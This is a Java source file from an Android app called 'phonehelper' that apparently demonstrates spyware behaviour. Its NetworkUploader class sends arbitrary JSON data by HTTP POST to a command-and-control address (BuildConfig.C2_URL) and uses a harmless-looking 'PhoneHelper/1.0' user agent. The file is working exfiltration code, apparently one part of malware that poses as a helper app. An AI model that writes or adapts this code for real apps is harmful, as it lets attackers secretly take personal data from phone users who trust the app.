package com.demo.phonehelper.data;

import com.demo.phonehelper.BuildConfig;
import com.demo.phonehelper.model.UploadResult;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public final class NetworkUploader {
    private NetworkUploader() {
    }

    public static UploadResult upload(String jsonData) {
        byte[] payload = jsonData.getBytes(StandardCharsets.UTF_8);
        HttpURLConnection connection = null;
        try {
            URL url = new URL(BuildConfig.C2_URL);
            connection = (HttpURLConnection) url.openConnection();
            connection.setConnectTimeout(12000);
            connection.setReadTimeout(12000);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            connection.setRequestProperty("User-Agent", "PhoneHelper/1.0");
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setInstanceFollowRedirects(true);

            try (OutputStream outputStream = connection.getOutputStream()) {
                outputStream.write(payload);
                outputStream.flush();
            }

            int responseCode = connection.getResponseCode();
            InputStream responseStream = responseCode >= 200 && responseCode < 400
                    ? connection.getInputStream()
                    : connection.getErrorStream();
            String preview = responseStream == null ? "empty-response" : readAsText(responseStream);
            return new UploadResult(
                    responseCode >= 200 && responseCode < 300,
                    responseCode,
                    trim(preview),
                    BuildConfig.C2_URL,
                    payload.length
            );
        } catch (Exception ex) {
            return UploadResult.failure(BuildConfig.C2_URL, trim(ex.getClass().getSimpleName() + ": " + ex.getMessage()), payload.length);
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private static String readAsText(InputStream inputStream) throws Exception {
        StringBuilder builder = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8))) {
            String line;
            while ((line = reader.readLine()) != null) {
                builder.append(line);
            }
        }
        return builder.toString();
    }

    private static String trim(String raw) {
        if (raw == null) {
            return "";
        }
        return raw.length() > 120 ? raw.substring(0, 120) + "..." : raw;
    }
}
